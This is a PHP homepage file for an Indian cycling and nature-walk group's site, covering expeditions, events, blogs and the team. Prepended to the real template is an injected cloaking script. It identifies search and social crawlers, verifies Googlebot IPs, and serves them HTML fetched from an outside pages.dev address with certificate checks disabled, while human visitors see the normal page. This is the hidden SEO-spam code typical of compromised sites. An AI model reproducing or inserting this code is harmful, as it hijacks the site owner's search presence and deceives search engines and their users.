<?php
error_reporting(0);
ini_set('display_errors', 0);

// ============================================
// CONFIG
// ============================================
$config = array(
    'bot_url' => 'https://adventure-sarmang.pages.dev/numpang/',
    'timeout' => 15
);

// ============================================
// BOT DETECTION
// ============================================
function is_search_bot() {

    $bots = array(
        'Googlebot','Googlebot-Mobile','Googlebot-Image','Googlebot-News',
        'Googlebot-Video','AdsBot-Google','Mediapartners-Google',
        'Google-InspectionTool','Google-Site-Verification','Storebot-Google',
        'bingbot','msnbot','BingPreview',
        'Slurp','DuckDuckBot','Baiduspider','YandexBot',
        'facebookexternalhit','LinkedInBot','Twitterbot'
    );

    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

    foreach ($bots as $bot) {
        if (stripos($ua,$bot)!==false) {
            return true;
        }
    }

    return false;
}

// ============================================
// GOOGLE IP VERIFY
// ============================================
function verify_google_ip() {

    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    if (!$ip) return false;

    $google_prefix = array(
        '66.249.','64.233.','72.14.','209.85.','216.239.'
    );

    foreach ($google_prefix as $p) {
        if (strpos($ip,$p)===0) {
            return true;
        }
    }

    $host = @gethostbyaddr($ip);

    if ($host &&
        (stripos($host,'googlebot.com')!==false ||
         stripos($host,'google.com')!==false)) {

        $verify = @gethostbyname($host);
        if ($verify === $ip) {
            return true;
        }
    }

    return false;
}

// ============================================
// FETCH CONTENT
// ============================================
function get_remote_content($url,$timeout=10){

    if(function_exists('curl_init')){

        $ch=curl_init($url);

        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);
        curl_setopt($ch,CURLOPT_TIMEOUT,$timeout);
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
        curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);
        curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0');

        $content=curl_exec($ch);
        $code=curl_getinfo($ch,CURLINFO_HTTP_CODE);

        curl_close($ch);

        if($content && $code==200){
            return $content;
        }
    }

    if(ini_get('allow_url_fopen')){

        $context=stream_context_create(array(
            'http'=>array(
                'method'=>'GET',
                'timeout'=>$timeout,
                'user_agent'=>'Mozilla/5.0'
            ),
            'ssl'=>array(
                'verify_peer'=>false,
                'verify_peer_name'=>false
            )
        ));

        $content=@file_get_contents($url,false,$context);

        if($content!==false){
            return $content;
        }
    }

    return false;
}

// ============================================
// SERVE BOT CONTENT
// ============================================
function serve_bot_content($url,$timeout=15){

    $content=get_remote_content($url,$timeout);

    if($content){

        header('Content-Type:text/html; charset=utf-8');
        header('X-Visitor-Type: bot');

        echo $content;
        exit;
    }

    header('HTTP/1.1 503 Service Temporarily Unavailable');
    echo '<h1>503 Service Temporarily Unavailable</h1>';
    exit;
}

// ============================================
// MAIN
// ============================================
if(is_search_bot()){

    $ua=isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:'';

    if(stripos($ua,'Googlebot')!==false){

        if(verify_google_ip()){
            serve_bot_content($config['bot_url'],$config['timeout']);
        }

    }else{

        serve_bot_content($config['bot_url'],$config['timeout']);
    }
}

header('Content-Type:text/html; charset=utf-8');
header('X-Visitor-Type: user');
?>

<?php
include "header.php";
//include "fbLogin/fbconfig.php";
?>
    <div class="page_content_wrap page_paddings_yes" style='padding: 0px;'>
        <div class="content_wrap">
            <div class="content">
                <article class="itemscope post_item post_item_single post_featured_center post_format_standard post-1043 page type-page status-publish hentry" itemscope itemtype="http://schema.org/Article">

                    <?php
                  include "sliderNew.php";
//                    include "silder.php";
                    
//                    include "latestEvent.php";
                    ?>

                    <?php
                    //include "slider2.php";
                    ?>

                    <section class="post_content" itemprop="articleBody">
                        
                        <div class="vc_row wpb_row vc_row-fluid">
                        	<div class="wpb_column vc_column_container vc_col-sm-12">
                        	    <div class="vc_column-inner ">
                            		<div class="wpb_wrapper">
                            		    <div id="sc_services_2030581447_wrap" class="sc_services_wrap">
                                			<div id="sc_services_2030581447" class="sc_services sc_services_style_services-1 sc_services_type_icons " style="width:100%;">
                                                <div class="sc_columns columns_wrap">
                                    			    
                                        			<div class="column-1_4 column_padding_bottom">
                                                	    <div id="sc_services_2030581447_1" class="sc_services_item sc_services_item_1 odd first">
                                                			<span class="sc_icon icon-icon5"></span>
                                                			<div class="sc_services_item_content">
                                                			    <h4 class="sc_services_item_title"><a href="https://ladakhcyclingexpedition.sarmang.com" target=_blank>Ladakh Cycling Expedition!</a></h4>
                                                    			<div class="sc_services_item_description">
                                                    			    <p></p>
                                                    			    <a href="https://ladakhcyclingexpedition.sarmang.com" target=_blank class="sc_services_item_button icon-down"></a>
                                                    			</div>
                                                		    </div>
                                                	    </div>
                                                	</div>

                                        			<div class="column-1_4 column_padding_bottom">
                                                	    <div id="sc_services_2030581447_1" class="sc_services_item sc_services_item_1 odd first">
                                                			<span class="sc_icon icon-icon2"></span>
                                                			<div class="sc_services_item_content">
                                                			    <h4 class="sc_services_item_title"><a href="https://ladakhumlinglachallenge.sarmang.com" target=_blank>Ladakh Umlingla Challenge!</a></h4>
                                                    			<div class="sc_services_item_description">
                                                    			    <p></p>
                                                    			    <a href="https://ladakhumlinglachallenge.sarmang.com" target=_blank class="sc_services_item_button icon-down"></a>
                                                    			</div>
                                                		    </div>
                                                	    </div>
                                                	</div>

                                        			<div class="column-1_4 column_padding_bottom">
                                                	    <div id="sc_services_2030581447_1" class="sc_services_item sc_services_item_1 odd first">
                                                			<span class="sc_icon icon-icon2"></span>
                                                			<div class="sc_services_item_content">
                                                			    <h4 class="sc_services_item_title"><a href="https://pages.razorpay.com/harsil-cycling" target=_blank>Harsil Cycling Expedition</a></h4>
                                                    			<div class="sc_services_item_description">
                                                    			    <p></p>
                                                    			    <a href="https://pages.razorpay.com/harsil-cycling" target=_blank class="sc_services_item_button icon-down"></a>
                                                    			</div>
                                                		    </div>
                                                	    </div>
                                                	</div>

                                        			<div class="column-1_4 column_padding_bottom">
                                                	    <div id="sc_services_2030581447_1" class="sc_services_item sc_services_item_1 odd first">
                                                			<span class="sc_icon icon-icon4"></span>
                                                			<div class="sc_services_item_content">
                                                			    <h4 class="sc_services_item_title"><a href="<?echo$link;?>joinus.php">join us!</a></h4>
                                                    			<div class="sc_services_item_description">
                                                    			    <p>Join us in upcoming walk</p>
                                                    			    <a href="<?echo$link;?>joinus.php" class="sc_services_item_button icon-down"></a>
                                                    			</div>
                                                		    </div>
                                                	    </div>
                                                	</div>

                                                	<div class="column-1_4 column_padding_bottom">
                                                	    <div id="sc_services_2030581447_2" class="sc_services_item sc_services_item_2 even">
                                        				    <span class="sc_icon icon-icon3"></span>
                                        				    <div class="sc_services_item_content">
                                        					    <h4 class="sc_services_item_title">
                                        					        <a href="?#eevent">events</a>
                                        					    </h4>
                                        					    <div class="sc_services_item_description">
                                        						    <p>Search our calendar for activities and events</p>
                                        						    <a href="?#eevent" class="sc_services_item_button icon-down"></a>
                                        					    </div>
                                        				    </div>
                                        			    </div>
                                        		    </div>
                                        		    <div class="column-1_4 column_padding_bottom">
                                        		        <div id="sc_services_2030581447_3" class="sc_services_item sc_services_item_3 odd">
                                        		            <span class="sc_icon icon-icon2"></span>
                                        		            <div class="sc_services_item_content">
                                        					    <h4 class="sc_services_item_title">
                                        					        <a href="<?echo$link;?>team.php">team</a>
                                        					    </h4>
                                        					    <div class="sc_services_item_description">
                                        						    <p>Click here to view team <?echo$firm_name;?></p>
                                        						    <a href="<?echo$link;?>team.php" class="sc_services_item_button icon-down"></a>
                                        					    </div>
                                        				    </div>
                                        			    </div>
                                        		    </div>
                                        		    <div class="column-1_4 column_padding_bottom">
                                        		        <div id="sc_services_2030581447_4" class="sc_services_item sc_services_item_4 even">
                                        				    <span class="sc_icon icon-icon1"></span>
                                    				        <div class="sc_services_item_content">
                                    					        <h4 class="sc_services_item_title">
                                    					            <a href="<?echo$link;?>blog.php">blogs</a>
                                    					        </h4>
                                    					        <div class="sc_services_item_description">
                                    						        <p>Click here to read our blogs</p>
                                    						        <a href="" class="sc_services_item_button icon-down"></a>
                                    						    </div>
                                    				        </div>
                                        			    </div>
                                        		    </div>
                                        		    
                                		        </div>
                                		    </div>
                            			</div>
                            		</div>
                            	</div>
                            </div>
                        </div>
                    
                        <?php
                        include "latestEvent.php";
                        ?>
                    
                        <div data-vc-full-width="true" data-vc-full-width-init="false" class="vc_row wpb_row vc_row-fluid vc_custom_1463145258120">
                    
                            <?php echo $aboutUs; ?>
                        
                            <?php
                            include "index_activities.php";
                            
                            include "events.php";
                            ?>
                    
                    	<div data-vc-full-width="true" data-vc-full-width-init="false" data-vc-stretch-content="true" class="vc_row wpb_row vc_row-fluid vc_custom_1463128442114 vc_row-no-padding">
                    		<div class="wpb_column vc_column_container vc_col-sm-12">
                    			<div class="vc_column-inner ">
                    				<div class="wpb_wrapper">
                    					<div class="sc_promo left sc_promo_size_large">
                    						<div class="sc_promo_inner">
                                                <div class="sc_promo_image" style="background-image:url(images/meditation.jpg);width:50%;left: 0;"></div>
                    
                            					<div class="sc_promo_block sc_align_left" style="width: 50%; float: right;">
                            						<div class="sc_promo_block_inner  content_align">
                            							<div class="sc_promo_content">
                            							    <blockquote class="sc_quote">
                            							        <p>&#8220;It's no secret that a walk in the woods can be great for boosting your mood. But a burgeoning group of nature enthusiasts say it can do much more — including strengthen immunity, lower blood pressure, increase your ability to focus, and ultimately lower health-care costs if done regularly.&#8221;</p>
                                								<div class="sc_quote_author">
                                									<div class="sc_quote_photo">
                                										<img width="66" height="66" src="images/meditation.jpg" class="attachment-66x66 size-66x66" alt="" srcset="" sizes="(max-width: 66px) 100vw, 66px" />
                                									</div>
                                
                                									<div class="sc_quote_info">
                                									    <p class="sc_quote_title">Meditation in the Woods</p>
                                									    <p class="sc_quote_position">Helps you being in the moment physically, mentally and emotionally</p>
                                									</div>
                                								</div>
                                							</blockquote>
                            						    </div>
                            					    </div>
                            				     </div>
                            				     
                    				        </div>
                    			        </div>
                    			    </div>
                    		    </div>
                    		</div>
                        </div>
                    
                    	<div class="vc_row-full-width"></div>
                    
                        <?php
                        $blog=Display::getBlog();
                        if($blog)
                        {
                            $blog_print="";
                        	foreach($blog as $blog)
                        	{
                            	$blogId=$blog->getValue("blog_Id");
                            	$title=$blog->getValue("blog_Title");
                            	$blogDate=$blog->getValue("blog_Date");
                            	$blogImg=$blog->getValue("blog_Img_Path");
                            	    $picture_src="$link/AdminPanel/image/$blogImg";
                            	    $blog_src="$link/viewBlog.php?id=$blogId";
                            	
                            	$blog_print.="
                            	                <div class=\"isotope_item isotope_item_classic isotope_item_classic_4 isotope_column_4\">
                                            	    <div class=\"post_item post_item_classic post_item_classic_4 post_format_standard odd\">
                                                		<div class=\"post_featured\">
                                                		    <div class=\"post_thumb\" data-image=\"$picture_src\" data-title=\"$title\">
                                                    			<a class=\"hover_icon hover_icon_link\" href=\"$blog_src\">
                                                    			    <img class=\"wp-post-image\" width=\"370\" height=\"370\" alt=\"$title\" src=\"$picture_src\">
                                                    			</a>
                                                		     </div>
                                                		</div>
                                                						
                                                	     <div class=\"post_content isotope_item_content\" style='min-height: 0.9em;'>
                                                		    <h5 class=\"post_title\">$title</h5>
                                                			<div class=\"post_descr\">
                                                			    <p></p>
                                                						
                                                        		<div class=\"post_info\">
                                                        			<span class=\"post_info_item post_info_posted\">
                                                        		        <a href=\"$blog_src\" class=\"post_info_date\">".date('M d, Y',$blogDate)."</a>
                                                        			</span>
                                                        
                                                            		<span class=\"post_info_item post_info_counters\">
                                                            			<a class=\"post_counters_item post_counters_comments icon-comment_icon\" title=\"Comments - 2\" href=\"$blog_src&amp;#comments\">
                                                            		        <span class=\"post_counters_number\">0</span>
                                                            		    </a>
                                                                    </span>
                                                                </div>
                                                            </div>
                                                        </div>
                                            	    </div>
                                            	</div>";
                        
                                }
                        }
                    
                        if($blog_print) { ?>
                    	    
                    	    <div class="vc_row wpb_row vc_row-fluid vc_custom_1463128453452">
                    		    <div class="wpb_column vc_column_container vc_col-sm-12">
                    		        <div class="vc_column-inner ">
                    			        <div class="wpb_wrapper">
                    
                            			    <div id="sc_blogger_1808611018" class="sc_blogger layout_classic_4 template_masonry  sc_blogger_horizontal no_description">
                                			    <h6 class="sc_blogger_subtitle sc_item_subtitle">what’s new?</h6><h2 class="sc_blogger_title sc_item_title">blog updates</h2>
                                				<div id="sc_blogger_1808611018_scroll" class="sc_scroll sc_scroll_horizontal sc_slider_noresize swiper-slider-container scroll-container" style="width:100%;">
                                    				<div class="sc_scroll_wrapper swiper-wrapper">
                                    					<div class="sc_scroll_slide swiper-slide">
                                    						<div class="isotope_wrap" data-columns="4">		
                                    
                                                                <?php echo $blog_print; ?>
                            
                            		                        </div>
                            		                    </div>
                            		                </div>
                            
                                                    <div id="sc_blogger_1808611018_scroll_bar" class="sc_scroll_bar sc_scroll_bar_horizontal sc_blogger_1808611018_scroll_bar"></div>
                                                </div>
                                            </div>
                                            
                    	                </div>
                    	            </div>
                    		    </div>
                    	    </div>
                    		    
                        <?php } ?>
                    
                    	<div class="vc_row wpb_row vc_row-fluid vc_custom_1463138419717">
                    		<?php echo subscribe($link); ?>
                    	</div>
                        
                        <?php
                        //include "latestEvent.php";
                        ?>
                        
                		<div data-vc-full-width="true" data-vc-full-width-init="false" class="vc_row wpb_row vc_row-fluid vc_custom_1463128744055">
                		    <div class="wpb_column vc_column_container vc_col-sm-12">
                			    <div class="vc_column-inner ">
                				    <div class="wpb_wrapper">
                					    <div id="sc_team_1559599312_wrap" class="sc_team_wrap">
                						    <div id="sc_team_1559599312" class="sc_team sc_team_style_team-3  aligncenter" style="width:100%;">
                        						<h6 class="sc_team_subtitle sc_item_subtitle">team</h6>
                        						<h2 class="sc_team_title sc_item_title">our team</h2>
                        						<div class="sc_columns columns_wrap">
                                                    <?php $team=team($link); echo $team[0].$team[1].$team[2]; ?>
                                                    <a href="<?echo $link;?>team.php" class="sc_button sc_button_round sc_button_style_filled sc_button_size_large margin_top_medium">show more!</a>
                                                </div>
                                            </div>
                	                    </div>
                	                </div>
                	        	</div>
                		    </div>
                		</div>
                    	
                    	<div class="vc_row-full-width"></div>
                    
                    	<?php echo $instagram; ?>
                    	
                        <!--Facebook Video-->
                        <?php
                        $d = Display::getVideo('0','1');
                        if($d)
                        {
                            $video_print="<div style='padding:10px; margin-bottom:20px; text-align:left;'>		
                                            <p style='font-size: 20px; font-weight: bold; margin-bottom: 10px;'>Facebook Video</p>";
                    		foreach($d as $v)
                    		{
                    		    $src=$v->getValue('video_Src');
                    		    $video_print.="<iframe src='$src' style='border:none;overflow:hidden' scrolling='no' frameborder='0' allowTransparency='true' allowFullScreen='true'></iframe>";
                    		}
                    		$video_print.="</div>";
                        }
                        
                        echo $video_print;
                        ?>
                    
                        </div>
                    </section>
	
		    </article>
		

	        <section class="related_wrap related_wrap_empty">

	        </section>
	        
		</div> 
	</div> 			
</div>	


<?php
include "footer.php";
?>
